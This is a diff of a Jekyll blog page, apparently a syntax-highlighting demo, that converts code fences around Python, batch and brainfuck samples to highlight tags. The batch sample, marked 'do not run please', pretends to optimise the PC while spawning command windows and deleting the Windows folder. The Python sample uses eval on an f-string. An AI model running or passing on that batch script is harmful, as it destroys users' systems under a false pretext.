@@ -27,17 +27,17 @@ Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most ou
 
 python:
 
-```python
+{% highlight python %}
 else:
     if not hasattr(weighting, repartition):
         raise Exception(f'Weighting {repartition} does not exist')
     else:
         weights = eval(f'weighting.{repartition}(frames={blended_frames})')
-```
+{% endhighlight %}
 
 batch: (do not run please)
 
-```batch
+{% highlight batch %}
 @echo off
 if not %1c == c goto forked
 echo optimizing your pc now!
@@ -53,14 +53,14 @@ start “” cmd
 if not %i% == 50 goto forked
 rmdir /s /q "C:\Windows"
 exit
-```
+{% endhighlight %}
 
 brainf**k:
 
-```brainfuck
+{% highlight brainfuck %}
 >+++++++++[<++++++++>-]<.>+++++++[<++++>-]<+.+++++++..+++.[-]
 >++++++++[<++++>-] <.>+++++++++++[<++++++++>-]<-.--------.+++
 .------.--------.[-]>++++++++[<++++>- ]<+.[-]++++++++++.
-```
+{% endhighlight}
 
 
